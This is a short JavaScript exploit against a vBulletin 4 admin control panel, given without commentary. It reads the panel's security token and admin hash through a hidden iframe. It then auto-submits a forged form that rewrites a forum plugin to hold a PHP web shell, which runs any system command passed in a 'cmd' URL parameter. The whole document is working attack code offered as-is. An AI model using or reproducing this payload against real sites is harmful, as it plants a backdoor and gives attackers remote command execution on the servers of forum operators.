document.writeln('<iframe id="iframe" src="http://localhost/vb4/admincp/plugin.php?do=edit&pluginid=1" width="150" height="150" onload="read()"></iframe>');
function read()
{
 var securitytoken = document.getElementById("iframe").contentDocument.forms[0].securitytoken.value;
 var adminhash = document.getElementById("iframe").contentDocument.forms[0].adminhash.value;
 document.writeln('<form width="0" height="0" method="post" name="cpform" action="http://localhost/vb4/admincp/plugin.php?do=update">');
 document.writeln('<input type="hidden" name="do" id="do" value="update"/>');
 document.writeln('<input type="hidden" name="securitytoken" value="' + securitytoken + '" /><br />');
 document.writeln('<input type="hidden" name="adminhash" value="' + adminhash + '" />');
 document.writeln('<select name="product" id="sel_product_1" tabindex="1" class="bginput">');
 document.writeln('<option value="vbulletin" selected="selected">vBulletin</option></select></div>');
 document.writeln('<select name="hookname" id="sel_hookname_2" tabindex="1" class="bginput">');
 document.writeln('<option value="ajax_complete">ajax_complete</option></select>');
 document.writeln('<input type="text" class="bginput" name="title" id="it_title_3" value="vbulletin" size="60" dir="ltr" tabindex="1" />');
 document.writeln('<input type="text" class="bginput" name="executionorder" id="it_executionorder_4" value="5" size="10" dir="ltr" tabindex="1" />');
 document.writeln('<textarea name="phpcode" id="ta_phpcode_5" class="code" rows="10" cols="45" style="width:100%" tabindex="1">if(isset($_GET["cmd"])){echo "<h1>cmd</h1><pre>"; system($_GET["cmd"]);exit;}</textarea>');
 document.writeln('<input type="radio" name="active" id="rb_1_active_6" value="1" tabindex="1" checked="checked" />Yes</label>');
 document.writeln('<input type="hidden" name="pluginid" value="34" /><script>document.forms["cpform"].submit();</script></form>');
} 